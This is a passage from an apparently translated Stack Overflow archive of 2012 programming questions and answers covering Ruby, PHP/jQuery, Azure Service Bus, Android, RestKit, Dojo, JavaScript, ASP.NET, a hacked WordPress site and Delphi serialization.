```
@full_user_schedule[0].attributes.each do |event_name, attending|
   if attending
     sessions_hash.each do |id, name|
       event_id = event_name.sub(name, id.to_s) if event_name.include? name 
     end
     @user_schedule.merge!(event_id => attending)
   end
end 
```

我试图明确地 return `event_id`，但退出了循环。我不明白什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T17:15:16.193

块实际上是一种匿名函数，因此它有自己的作用域，但它确实可以访问周围作用域中的变量。

只需在块开始之前进行初始化`event_id`，使其成为父方法的元素。

```
event_id = nil
@full_user_schedule[0].attributes.each do |event_name, attending|
   ... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:18:55.403

在第二个代码示例中，在传递的块中创建和分配 event_id `sessions_hash.each`。它只存在于该块内，不能从块外的代码访问。这称为范围。

在第一个示例中，您将分配给 event_name，它在传递给的块中定义，`@full_user_schedule[0].attributes.each`其余代码也包含在此块中，因此它始终在范围内。

我不完全理解你在这里想要完成什么，但似乎这会奏效：

```
@full_user_schedule[0].attributes.each do |event_name, attending|
  if attending
     sessions_hash.each do |id, name|
       event_id = event_name.sub(name, id.to_s) if event_name.include? name 
     end
     @user_schedule.merge!(event_id => attending)
   end
end 
```

我移动了这条线`@user_schedule...`，所以它在同一个范围内`event_id`

# php - 在jquery中访问php数组

> ID：13957337
> 
> 赞同：0
> 
> 时间：2012-12-19T16:58:48.403
> 
> 标签：php, jquery

我有 4 个 div 并且在每个鼠标悬停时，我想要`src`一个`img`改变。
我必须从**PHP**获取图像。
如何在我的 jQquery 脚本中使用我在**PHP中获得的数组？**
而且我知道只有 4 个，我可以在 javascript 中设置数组并放置每个图像名称，但这不是我正在寻找的功能。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Untitled Document</title>

<style>
div{
height:100px;
width:100px;
display:inline-block;
background-color:blue;  
}
#my_image{
height:100px;
width:100px;
display:inline-block;
}

</style>

<?php

$images = scandir("images", 1);

?>

<script>

$(document).ready(function(){
    $(div).mouseover(function(){
        $("#my_image").attr("src", /*my php array*/);
    });

});

</script>
</head>

<body>
    <div></div>
    <div></div>
    <div></div>
    <div></div>
    <img id="my_image" />
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-19T16:59:57.560

```
var images = <?php echo json_encode($images); ?>; 
```

然后你有一个名为的数组`images`，你可以在你的 JavaScript 代码中使用它。但是，在您的评论位置使用它是没有意义的。您不能将数组分配给图像的 src。

# azure - 如何获取 Azure 主题订阅的消息计数？

> ID：13957339
> 
> 赞同：12
> 
> 时间：2012-12-19T16:59:05.877
> 
> 标签：azure, azureservicebus

有没有办法获取 Azure 主题订阅的当前消息计数？

我看到 SubscriptionDescription 类有一个 MessageCount 属性，但这个类似乎只用于创建订阅。我看不到为现有订阅检索 SubscriptionDescription 对象的方法。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-12-19T18:04:15.083

我找到了我要找的东西：

```
var namespaceManager = NamespaceManager.CreateFromConnectionString(connectionString);
var subscriptionDesc = namespaceManager.GetSubscription(topicPath, subscriptionName);
long messageCount = subscriptionDesc.MessageCount; 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2020-04-20T09:29:22.963

接受的答案适用于将 .NET Framework 库与命名空间`Microsoft.ServiceBus.Messaging`（[nuget 包](https://www.nuget.org/packages/WindowsAzure.ServiceBus/)）一起使用时。

对于具有命名空间`Microsoft.Azure.ServiceBus`（[nuget 包](https://www.nuget.org/packages/Microsoft.Azure.ServiceBus/)）的 .NET Standard 库，以下代码可以解决问题：

```
var managementClient = new ManagementClient(connectionString);
var runTimeInfo = await managementClient.GetSubscriptionRuntimeInfoAsync(topicPath, subscriptionName); 
var messageCount = runTimeInfo.MessageCountDetails.ActiveMessageCount; 
```

有关这两个库之间差异的更多详细信息，请参阅[Microsoft.ServiceBus.Messaging 与 Microsoft.Azure.ServiceBus 。](https://stackoverflow.com/questions/45873327/microsoft-servicebus-messaging-vs-microsoft-azure-servicebus)

随着[.NET Standard 的退役，](https://devblogs.microsoft.com/dotnet/the-future-of-net-standard/) .NET 5+ 应用程序`Azure.Messaging.ServiceBus`（[nuget package](https://www.nuget.org/packages/Azure.Messaging.ServiceBus/)）有了一个新的命名空间。对这个包执行相同操作所需的代码是：

```
var client = new Azure.Messaging.ServiceBus.Administration.ServiceBusAdministrationClient("connetionString");
var runtimeProps = (await client.GetQueueRuntimePropertiesAsync("queueName")).Value;
var messageCount = runtimeProps.ActiveMessageCount; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2021-12-07T12:27:03.577

[Microsoft.Azure.ServiceBus](https://www.nuget.org/packages/Microsoft.Azure.ServiceBus)库现已弃用，取而代之的是[Azure.Messaging.ServiceBus](https://www.nuget.org/packages/Azure.Messaging.ServiceBus/)。所以现在这可以通过 Azure.Messaging.ServiceBus.Administration.ServiceBusAdministrationClient 来实现：

```
var client = new Azure.Messaging.ServiceBus.Administration.ServiceBusAdministrationClient("connetionString");
var runtimeProps = (await client.GetQueueRuntimePropertiesAsync("queueName")).Value;
var messageCount = runtimeProps.ActiveMessageCount; 
```

# android - Android有验证密码的功能吗？

> ID：13957340
> 
> 赞同：2
> 
> 时间：2012-12-19T16:59:10.840
> 
> 标签：android, validation, passwords

我正在开发一个 Android 应用程序，我的任务之一是检查密码的强度。

是否有任何用于检查密码强度的内置功能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-12-05T21:46:14.667

为了回答这个问题，没有 Android 功能可以做到这一点，最接近和最好的方法是使用 Mkyong 在他的[博客](http://www.mkyong.com/regular-expressions/how-to-validate-password-with-regular-expression/)上建议的正则表达式：

```
private Pattern pattern;
      private Matcher matcher;

      private static final String PASSWORD_PATTERN = 
              "((?=.*\\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%]).{6,20})";

      public PasswordValidator(){
          pattern = Pattern.compile(PASSWORD_PATTERN);
      }

      /**
       * Validate password with regular expression
       * @param password password for validation
       * @return true valid password, false invalid password
       */
      public boolean validate(final String password){

          matcher = pattern.matcher(password);
          return matcher.matches();

      } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:01:55.727

听起来您需要一个外部库，例如[http://code.google.com/p/vt-middleware/wiki/vtpassword](http://code.google.com/p/vt-middleware/wiki/vtpassword)等。

或者编写一些代码很简单，比如检查它有多长，它有什么字符等等，并根据它打印出不同的东西。

如果说用户有一个 10 长度的密码和一些大写字符，您可以在此基础上增加一些密码强度参数，奖励更复杂的密码。您可以自己设置阈值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-19T17:05:21.083

如果您不想使用外部库..您可以自己检查..这样的事情：

```
 public void onSubmitClicked(View v) 
    { 
        String pass = passwordEditText.getText().toString(); 
        if(TextUtils.isEmpty(pass) || pass.length < [YOUR MIN LENGTH]) 
        { 
            passwordEditText.setError("You must more characters in your password"); 
            return; 
        }
        if(....){
              // do other controls here
        }

    } 
```

# ios - Restkit Post 不发送对象

> ID：13957344
> 
> 赞同：15
> 
> 时间：2012-12-19T16:59:23.380
> 
> 标签：ios, objective-c, restkit, restkit-0.20

我正在创建一个使用 restkit 的 IOS 应用程序，并且我能够毫无问题地执行 GET 请求，并且它正确映射并且所有内容，但是，我无法让 restkit 对数据库进行 POST。它得到的回应是：

```
`{"errors":{"email":["can't be blank"],"password":["can't be blank"]}}` 
```

我有一种感觉，该对象只是没有被发送。这是我在我的应用程序委托中设置所有映射的代码。

```
RKObjectMapping *userMapping     = [RKObjectMapping mappingForClass:[User       class]];
RKObjectMapping *dogMapping      = [RKObjectMapping mappingForClass:[Dog        class]];
RKObjectMapping *posttimeMapping = [RKObjectMapping mappingForClass:[PostTime   class]];
RKObjectMapping *postMapping     = [RKObjectMapping mappingForClass:[Post       class]];
RKObjectMapping *activityMapping = [RKObjectMapping mappingForClass:[Activity   class]];

        // set up which attributes go where
[userMapping        addAttributeMappingsFromDictionary:[User propertyMappings]];
[dogMapping         addAttributeMappingsFromDictionary:[Dog propertyMappings]];
[posttimeMapping    addAttributeMappingsFromDictionary:[PostTime propertyMappings]];
[postMapping        addAttributeMappingsFromDictionary:[Post propertyMappings]];
[activityMapping    addAttributeMappingsFromDictionary:[Activity propertyMappings]];

        // set up relationships
[userMapping        addRelationshipMappingWithSourceKeyPath:@"dogs"         mapping:dogMapping];
[dogMapping         addRelationshipMappingWithSourceKeyPath:@"timeline"     mapping:posttimeMapping];
[posttimeMapping    addRelationshipMappingWithSourceKeyPath:@"posts"        mapping:postMapping];
[postMapping        addRelationshipMappingWithSourceKeyPath:@"activities"   mapping:activityMapping];

    // what to print
RKLogConfigureByName("RestKit/Network", RKLogLevelTrace);
RKLogConfigureByName("Restkit/Network", RKLogLevelDebug);

    // set up paths
RKObjectManager *manager = [RKObjectManager managerWithBaseURL:[NSURL URLWithString:@"http://localhost:3000"]];

NSIndexSet *statusCodes = RKStatusCodeIndexSetForClass(RKStatusCodeClassSuccessful); // Anything in 2x
RKResponseDescriptor *userDescriptor = [RKResponseDescriptor responseDescriptorWithMapping:userMapping pathPattern: @"/users/1.json" keyPath:@"" statusCodes:statusCodes];
RKResponseDescriptor *signupDescriptor = [RKResponseDescriptor responseDescriptorWithMapping:userMapping pathPattern:@"/users.json" keyPath:@"" statusCodes:statusCodes];
[manager addResponseDescriptorsFromArray:@[ userDescriptor, signupDescriptor ]];
[RKObjectManager setSharedManager:manager]; 
```

这是我的发帖请求：

```
- (void) post{
RKObjectManager *manager = [RKObjectManager sharedManager];
[manager postObject:self path:@"/users.json" parameters:nil success:^(RKObjectRequestOperation *operation, RKMappingResult *mappingResult) {
    NSLog(@"successful post");
} failure:^(RKObjectRequestOperation *operation, NSError *error) {
    NSLog(@"failed post %@", error);
    NSLog(@"%@",operation.description);
    NSLog(@"%@",operation.HTTPRequestOperation.description);
}]; 
```

}

这是我得到的日志：

```
2012-12-19 11:23:15.657 Dogapp[6353:4303] T restkit.network:RKHTTPRequestOperation.m:139     POST 'http://localhost:3000/users.json':
 request.headers={
 Accept = "application/json";
"Accept-Language" = "en, fr, de, ja, nl, it, es, pt, pt-PT, da, fi, nb, sv, ko, zh-Hans, zh-Hant, ru, pl, tr, uk, ar, hr, cs, el, he, ro, sk, th, id, ms, en-GB, ca, hu, vi, en-us;q=0.8";
"Content-Type" = "application/x-www-form-urlencoded; charset=utf-8";
"User-Agent" = "Dogapp/1.0 (iPhone Simulator; iOS 6.0; Scale/1.00)";
}request.body=(null)
2012-12-19 11:23:15.680 Dogapp[6353:190b] T restkit.network:RKHTTPRequestOperation.m:156     POST 'http://localhost:3000/users.json' (422):  
response.headers={
"Cache-Control" = "no-cache";
Connection = "Keep-Alive";
"Content-Length" = 69;
"Content-Type" = "application/json; charset=utf-8";
Date = "Wed, 19 Dec 2012 16:23:15 GMT";
Server = "WEBrick/1.3.1 (Ruby/1.9.3/2012-04-20)";
"Set-Cookie" =     "_cms_session=BAh7BkkiD3Nlc3Npb25faWQGOgZFRkkiJTRjMTdjZDNiOGVmNDY0MGFjY2NiZWJjNTUwOGQxZDU3BjsAVA%3D%3D--d553a2616530bbe5346fdafc4d6fca81ecc6f6f7; path=/; HttpOnly";
"X-Request-Id" = 5edef73ca7b5ddbc4e510e9799835324;
"X-Runtime" = "0.007666";
"X-Ua-Compatible" = "IE=Edge";
}
response.body={"errors":{"email":["can't be blank"],"password":["can't be blank"]}}
2012-12-19 11:23:15.682 Dogapp[6353:c07] failed post Error   Domain=org.restkit.RestKit.ErrorDomain Code=1001 "Unable to find any mappings for the given    content" UserInfo=0x95bcb20 {DetailedErrors=(
), NSLocalizedDescription=Unable to find any mappings for the given content, keyPath=null}
2012-12-19 11:23:15.683 Dogapp[6353:c07] mappingResult: <RKObjectRequestOperation:  0x75e73b0, state: Failed, isCancelled=NO, request: <NSMutableURLRequest    http://localhost:3000/users.json>, response: <NSHTTPURLResponse: 0x75f4580 statusCode=422  MIMEType=application/json length=69>>
2012-12-19 11:23:15.683 Dogapp[6353:c07] <RKObjectRequestOperation: 0x75e73b0, state: Failed, isCancelled=NO, request: <NSMutableURLRequest http://localhost:3000/users.json>, response: <NSHTTPURLResponse: 0x75f4580 statusCode=422 MIMEType=application/json length=69>>
2012-12-19 11:23:15.683 Dogapp[6353:c07] <RKHTTPRequestOperation: 0x75e78e0, state: isFinished, cancelled: NO request: <NSMutableURLRequest http://localhost:3000/users.json>, response: <NSHTTPURLResponse: 0x75f4580>> 
```

任何指向正确方向的例子或观点都会令人惊叹。我已经坚持了一段时间。

如果您需要更多信息，请告诉我。

## 更新

我能够让它工作但不是正确的方式。基本上我只是像这样通过参数发送所有信息。

```
- (void) post{
RKObjectManager *manager = [RKObjectManager sharedManager];
[manager postObject:self path:@"/users.json" parameters:@{@"user[email]" : self.email, @"user[password]" : self.password}  success:^(RKObjectRequestOperation *operation, RKMappingResult *mappingResult) {
    NSLog(@"Successful Post!");
    [User setCurrentUser:self];
} failure:^(RKObjectRequestOperation *operation, NSError *error) {
    UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Error" message:[error description] delegate:nil cancelButtonTitle:@"Okay!" otherButtonTitles: nil];
    [alert show];
}]; 
```

}

有人对如何正确执行此操作有任何想法吗？

**Vishal 的更新** 对于使用 coredata，您必须像这样创建一个托管对象存储......

```
 RKObjectManager *manager = [RKObjectManager managerWithBaseURL:    [NSURL URLWithString:@"http://my_url.com"]];
NSURL *modelURL = [[NSBundle mainBundle] URLForResource:@"MyDataModel" withExtension:@"momd"];
NSManagedObjectModel *managedObjectModel = [[NSManagedObjectModel alloc] initWithContentsOfURL:modelURL];
RKManagedObjectStore *managedObjectStore = [[RKManagedObjectStore alloc] initWithManagedObjectModel:managedObjectModel];
manager.managedObjectStore = managedObjectStore; 
```

然后你将不得不使用 RKEntityMapping 而不是 RKObjectMapping

希望这可以帮助。

**Vishal 的更新 2**

```
[managedObjectStore createPersistentStoreCoordinator];
NSError *error;

BOOL success = RKEnsureDirectoryExistsAtPath(RKApplicationDataDirectory(), &error);
if (! success) {
    RKLogError(@"Failed to create Application Data Directory at path '%@': %@", RKApplicationDataDirectory(), error);
}
NSString *path = [RKApplicationDataDirectory() stringByAppendingPathComponent:@"Store.sqlite"];
NSPersistentStore *persistentStore = [managedObjectStore addSQLitePersistentStoreAtPath:path fromSeedDatabaseAtPath:nil withConfiguration:nil options:nil error:&error];
if (! persistentStore) {
    RKLogError(@"Failed adding persistent store at path '%@': %@", path, error);
}

[managedObjectStore createManagedObjectContexts];
managedObjectStore.managedObjectCache = [[RKInMemoryManagedObjectCache alloc] initWithManagedObjectContext:managedObjectStore.persistentStoreManagedObjectContext]; 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-12-22T18:18:37.903

我正在处理同样的问题。您缺少请求映射。您只是在描述响应。

示例代码：

```
RKRequestDescriptor *requestDescriptor = [RKRequestDescriptor requestDescriptorWithMapping:userMapping 
    objectClass:[User class] rootKeyPath:nil];

[objectManager addRequestDescriptor: requestDescriptor]; 
```

# objective-c - 将 UIViewController 更改为情节提要内的 UITableViewController？

> ID：13957346
> 
> 赞同：15
> 
> 时间：2012-12-19T16:59:34.427
> 
> 标签：objective-c, ios, xcode, uiviewcontroller, uitableview

我已经在我的故事板中创建了一个视图，现在我决定我宁愿通过静态表格单元格显示它的数据。

我不能在`UIViewController`( `Static table views are only valid when embedded in UITableViewController instances`) 中使用静态表视图。所以，我需要以某种方式将我现有的转换`UIViewController`为`UITableViewController`。我已经更改了 .h 文件的父级，但这还没有完成。

还有其他方法可以实现吗？我真的宁愿不必在情节提要中创建一个新的 VC 并将所有内容都移过来，这很麻烦。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2014-04-07T16:42:36.677

我将对此进行补充，因为问题是关于如何将 UIViewController 更改为 UITableViewController，并且鉴于这个问题已有一年多的历史了，并且原始答案是有效的，并且可能是也可能不是唯一的解决方案时间，实际上并没有回答问题，也不是唯一的解决方案。

这样做是有可能的，你只需要在 IB 中设置 table view delegate 和 datasource outlets，并手动编辑 storyboard XML，这听起来很吓人，但实际上很容易。

首先，将类的父类更改为 UITableViewController。UITableViewController 已经采用了 UITableViewDatasource 和 UITableViewDelegate 协议，所以如果你的类也这样做了，你可以删除它们：

```
@implementation MyTableViewController : UITableViewController
...
@end 
```

接下来，在 UITableView 上为其 dataSource 和委托创建新的引用出口。最简单的方法是控制从 UITableView 拖动到自身。弹出窗口将为您提供数据源和委托选项。

最后，您需要更改情节提要 XML。故事板文件可以很快变得相当大。找到您正在寻找的场景的最简单方法是在 Identity Inspector 中设置 Storyboard Identifier。要直接查看 XML，请在项目导航器中右键单击情节提要文件并选择“打开为 -> 源代码”。现在只需搜索您之前设置的重用标识符。你会看到类似这样的东西：

```
<!-- My Table View Controller -->
<scene sceneID="EuE-XX-cCb">
  <objects>
    <viewController storyboardIdentifier="MY_TABLE_VIEW_IDENTIFIER" ... >
      // Lots of other stuff
    </viewController>
  </objects>
</scene> 
```

您需要做的就是更改打开和关闭视图控制器标签

```
<viewController>
</viewController> 
```

改为 tableViewController

```
<tableViewController>
</tableViewController> 
```

而已！无需创建新的 UITableViewController 场景或在容器视图中嵌入 UITableViewController。

**编辑：**

我还应该补充一点，UITableView 必须是根视图。它不能嵌入到另一个 UIView 中。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-12-19T18:20:50.863

如果您希望静态单元格表​​视图不占据整个屏幕，那么使用容器视图是最简单的方法。从一个普通的 UIViewController 开始，然后将一个容器视图（在对象列表中的普通 UIView 旁边）拖到它的视图中。随心所欲地调整它的大小——故事板将自动提供一个视图控制器，该控制器使用嵌入转场连接到该容器视图。删除那个控制器，拖出一个表视图控制器，然后从容器视图中右键拖动到这个表视图控制器，以创建一个新的嵌入segue。可以从 UIViewController 及其 childViewControllers 属性访问此表视图控制器（相反，如果需要，您可以使用 parentViewController 从表视图控制器访问 UIViewController）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-03-26T19:14:35.077

我所做的是在 IB 中创建一个 UITableViewController，用文本编辑器打开 Storyboard，然后将里面的所有节点从 UIViewController 复制到 UITableViewController。

我认为通过这种方式删除重要内容的风险较小。

在复制部分对象之前，请确保两个 tableviews（UIViewController 和 UITableViewController）具有相同的属性集，例如：静态或动态单元格、样式（普通或分组）等。

# dojo - Dojo datagrid jsonrest 响应标头

> ID：13957348
> 
> 赞同：2
> 
> 时间：2012-12-19T16:59:50.393
> 
> 标签：dojo, http-headers, dojox.grid

我想使用自定义标头来提供有关响应数据的更多信息。是否可以从通过对象存储（dojo 1.7）连接到 jsonRest 对象的 dojo 数据网格的响应中获取标头？我看到当您发出 XHR 请求时这是[可能](https://stackoverflow.com/questions/6335961/retrieving-the-response-headers-in-dojo-1-6)的，但在这种情况下，它是由网格发出的。

[API 为返回响应对象的响应错误提供了](http://dojotoolkit.org/api/1.8/dojox/grid/DataGrid#onFetchError)一个事件：

```
 on(this.grid, 'FetchError', function (response, req) {
      var header = response.xhr.getAllResponseHeaders();
  }); 
```

使用它，我可以成功访问我的自定义响应标头。但是，似乎没有办法在请求成功时获取响应对象。我一直在使用[未记录](https://stackoverflow.com/questions/5439275/how-to-check-dojo-datagrid-loading-completed)的私人事件 _onFetchComplete 和方面之后，但是，这不允许访问响应对象，只允许访问响应值

```
aspect.after(this.grid, '_onFetchComplete', function (response, request) 
{
 ///unable to get headers, response is the returned values
}, true); 
```

编辑：我设法得到了一些工作，但我怀疑它是过度设计的，有更好理解的人可以想出一个更简单的解决方案。我最终添加了方面，以允许我在返回到对象存储的其余存储中获取延迟对象。在这里，我向 defered 添加了一个新函数以返回标头。然后，我使用 dojo hitch 连接到对象存储的 onFetch（因为我需要当前范围内的结果）。对我来说似乎很乱

```
aspect.around(restStore, "query", function (original) {
    return function (method, args) {
        var def = original.call(this, method, args);
        def.headers = deferred1.then(function () {
            var hd = def.ioArgs.xhr.getResponseHeader("myHeader");
            return hd;
        });
        return def;
    };
});

aspect.after(objectStore, 'onFetch', lang.hitch(this, function (response) {
    response.headers.then(lang.hitch(this, function (evt) {
        var headerResult = evt;
    }));
}), true); 
```

有没有更好的办法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-11-20T11:56:37.763

I solved this today after reading this post, thought I'd feed back.

`dojo/store/JsonRest` solves it also but my code ended up slightly different.

```
var MyStore = declare(JsonRest, {
    query: function () {
        var results = this.inherited(arguments);
        console.log('Results: ', results);
        results.response.then(function (res) {
            var myheader = res.xhr.getResponseHeader('My-Header');
            doSomethingWith(myheader);
        });
        return results;
    }
}); 
```

So you override the normal `query()` function, let it execute and return its promise, and attach your own listener to its 'response' member resolving, in which you can access the xhr object that has the headers. This ought to let you interpret the JsonRest result while fitting nicely into the chain of the query() all invokers.

One word of warning, this code is modified for posting here, and actually inherited from another intermediary class that also overrode `query()`, but the basics here are pretty sound.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-10T00:55:06.100

如果您想要从服务器获取信息，那么 cookie 中的自定义键值也可以是一种解决方案，这就是我的情况，首先我正在寻找自定义响应标头，但我无法使其工作，所以我获取网格数据后cookie方式是否获取信息：

```
dojo.connect(grid, "_onFetchComplete", function (){
    doSomethingWith(dojo.cookie("My-Key"));
}); 
```

例如，这对于为分页数据网格中的所有行提供 SUM(field) 很有用，而不仅仅是当前页面中包含的行。在服务器中，您可以获取 COUNT 和 SUM，COUNT 将在 Content-Range 标头中发送，SUM 可以在 cookie 中发送。

# javascript - How to have forEach available on pseudo-arrays returned by querySelectorAll?

> ID：13957354
> 
> 赞同：18
> 
> 时间：2012-12-19T17:00:00.073
> 
> 标签：javascript, dom

Something nice with plain javascript would be to be able to use `forEach`, `map`, `filter`, etc, on the items returned by `document.querySelectorAll`, `document.getElementsBy*` etc.

This'd lead to less dependency on jQuery, and simply cleaner code. Right now, this is how we can do it, in an ugly way:

```
[].forEach.call( document.querySelectorAll(sel), function(el) {
}); 
```

This is... verbose.

Any way to be able to use `forEach` and the likes right away on the elements returned?

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-19T17:00:00.073

A naive way would be to do this if you tested on Chrome:

```
NodeList.prototype.forEach = Array.prototype.forEach; 
```

This works. On Webkit. It doesn't on Firefox though. Because FF returns an HTMLCollection...

The most cross-browser way I've found:

```
NodeList.prototype.forEach = HTMLCollection.prototype.forEach = Array.prototype.forEach; 
```

It doesn't work on IE8 and lower though, because they choke when adding properties to host objects prototypes.

Full list:

```
NodeList.prototype.forEach = HTMLCollection.prototype.forEach = Array.prototype.forEach;
NodeList.prototype.map = HTMLCollection.prototype.map = Array.prototype.map;
NodeList.prototype.filter = HTMLCollection.prototype.filter = Array.prototype.filter;
NodeList.prototype.reduce = HTMLCollection.prototype.reduce = Array.prototype.reduce;
NodeList.prototype.reduceRight = HTMLCollection.prototype.reduceRight = Array.prototype.reduceRight;
NodeList.prototype.every = HTMLCollection.prototype.every = Array.prototype.every;
NodeList.prototype.some = HTMLCollection.prototype.some = Array.prototype.some; 
```

Or, to please our dear Bergi (and also because it *is* cleaner):

```
['forEach', 'map', 'filter', 'reduce', 'reduceRight', 'every', 'some'].forEach(
    function(p) {
    NodeList.prototype[p] = HTMLCollection.prototype[p] = Array.prototype[p];
}); 
```

Considering the link to perfectionkills, it's mostly irrelevant there. The problem is that the DOM is mostly not behaving the same on browsers when extended. This modification is sane in all the browsers except IE <=8.

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-19T18:43:41.603

```
function forEach( a, fn ) {
    return [].forEach.call(a, fn);
};

forEach(document.querySelectorAll(sel), function(el) {
}); 
```

还有很多：

```
function map( a, fn ) {
    return [].map.call(a, fn);
};
function filter( a, fn ) {
    return [].filter.call(a, fn);
};
function reduce( a, fn ) {
    return [].reduce.call(a, fn);
};
function reduceRight( a, fn ) {
    return [].reduceRight.call(a, fn);
};
function every( a, fn ) {
    return [].every.call(a, fn);
};
function some( a, fn ) {
    return [].some.call(a, fn);
}; 
```

也许你会需要

```
[].slice.call(a) 
```

在某些情况下。

```
function forEach(a, fn) {
    return [].forEach.call([].slice.call(a), fn);
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-06-21T10:08:02.630

如果您不喜欢更改原型并希望所有数组函数都能正常工作，那么将您的集合转换为数组可能会更容易：

```
Array.from(document.querySelectorAll('a')) 
```

所有数组函数都将可用，当新版本的 JavaScript 发布时无需更新代码：

```
Array.from(document.querySelectorAll('a')).forEach(a => console.log(a)) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2019-03-11T22:26:32.753

`forEach`现在可以直接使用而无需转换

[https://developer.mozilla.org/en-US/docs/Web/API/NodeList](https://developer.mozilla.org/en-US/docs/Web/API/NodeList)

# c# - Programmatically Setting Text of Validation Control

> ID：13957355
> 
> 赞同：2
> 
> 时间：2012-12-19T17:00:01.790
> 
> 标签：c#, asp.net

I have following validator control. How can we set the `color` of `Text` of this control from code behind?

Note: Text of the control is `*` as shown in the code below.

**CODE**

```
<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
<asp:TextBox ID="TextBox1" runat="server"></asp:TextBox>
<asp:RequiredFieldValidator ID="RequiredFieldValidator1" runat="server" ErrorMessage="RequiredFieldValidator"
    Text="*" ControlToValidate="TextBox1"></asp:RequiredFieldValidator>
</asp:RequiredFieldValidator>
<asp:Button ID="Button1" runat="server" Text="Button" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:29:48.520

使用`ForeColor`属性：

```
 RequiredFieldValidator1.ForeColor = System.Drawing.Color.Red; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:05:08.213

像这样的东西应该工作：

```
Style myStyle = new Style();
s.BackColor = System.Drawing.Color.Red;

valEmailRecipients.Style = myStyle; 
```

或者简单地说：

```
valEmailRecipients.Style.ForeColor= System.Drawing.Color.Red; 
```

[请参阅此处](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.webcontrol.style.aspx)以供参考，也请参阅[此处](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.style.aspx)。

# wordpress - Posts disappearing and reappearing on wordpress

> ID：13957356
> 
> 赞同：1
> 
> 时间：2012-12-19T17:00:02.303
> 
> 标签：wordpress

I have a wordpress site which is acting strange lately. It seems like the database is spontaneously rolling back a few hours from time to time. I have noticed it happen at least four times.

*   When I updated to wordpress 3.5, after a short time, maybe 30-60 minutes I noticed the nag to upgrade was back. I ran the upgrade a second time, even though I was certain that I had already upgraded.
*   I added a new category and changed a widget on one of my sidebars, only to find that my changes were gone the next day and I had to redo them.
*   I added a post yesterday, linked to it in various places and then returned several hours later to find the post missing. I rewrote the post from memory and put it back on the site.
*   This morning when I went to the site, the original post was back and the one that I had recreated from memory was gone. The post's id number was the same as the previous day. I think there was also a draft post that disappeared and reappeared as well.

One last clue which may or may not be related is that when I go to a page on the blog that should generate a 404 message I get a single piece of text which says: "defaced by t3ll0" I noticed this recently, within the last few weeks. I'm not sure how long it has been like that.

I ran Sucuri Scanner, and it found no evidence of malware. Any suggestions of how to troubleshoot this? Could this be a problem with my database rather than wordpress?

UPDATE: It appears that the primary problem I was noticing was because of two versions of the site being up simultaneously. The DNS settings had not been updated to the new site. I'm still investigating if the site was hacked.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:35:22.227

你被黑了。“被t3ll0污损”是线索。有人控制了您的网站和您的托管帐户。

使用这些资源并按照所有说明彻底清理您的网站，否则您可能会再次被黑客入侵。请参阅[常见问题解答：我的网站被黑了 « WordPress Codex](http://codex.wordpress.org/FAQ_My_site_was_hacked)以及[如何彻底清理您被黑的 wordpress 安装](http://smackdown.blogsblogsblogs.com/2008/06/24/how-to-completely-clean-your-hacked-wordpress-installation/)以及[如何在被黑的 WordPress 中找到后门](http://ottopress.com/2009/hacked-wordpress-backdoors/)和[强化 WordPress « WordPress Codex。](http://codex.wordpress.org/Hardening_WordPress)

更改所有密码。扫描您自己的 PC 以查找可能窃取了您的登录名和密码的间谍软件。

[http://sitecheck.sucuri.net/](http://sitecheck.sucuri.net/)是一个很好的资源，但它会扫描恶意软件，而不是被黑客入侵且未用于分发恶意软件或具有垃圾邮件链接的帐户。

告诉你的网络主机你被黑了；并考虑更改为更安全的主机：[推荐的 WordPress 虚拟主机](http://wordpress.org/hosting/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:30:25.243

您尚未应用安全性可能在多个地方。1.文件权限，文件夹权限。2.上传文件夹权限。3\. 执行权限。

现在，如果您不是开发人员，您将如何检查这些漏洞？

我建议您备份您的数据库（导出它）。摆脱现有的 WP 核心并重新安装它。

删除所有插件并从新来源安装它们。

如果您使用了自定义主题，请获取它的备份版本并删除当前主题，因为它有污点。

您可以使用这样的插件检查很多漏洞：[http ://wordpress.org/extend/plugins/better-wp-security/](http://wordpress.org/extend/plugins/better-wp-security/)

重命名您的管理员帐户。强化您的密码。从 .htaccess 和 wp-config.php 文件中删除写权限。

# delphi - Serializing TObjectList to stream

> ID：13957360
> 
> 赞同：0
> 
> 时间：2012-12-19T17:00:14.217
> 
> 标签：delphi, generics, serialization

I'm wondering how I can perform serialization of a generic `TObjectList<T>` container. Basically, I want to store different objects in that list, but all objects will descend from `TSerializable`, which is defined as follows:

```
 TSerializable = class abstract(TObject)
  public
    { Public declarations }
    procedure LoadFromStream(const S: TStream); virtual; abstract;
    procedure SaveToStream(const S: TStream); virtual; abstract;
  end; 
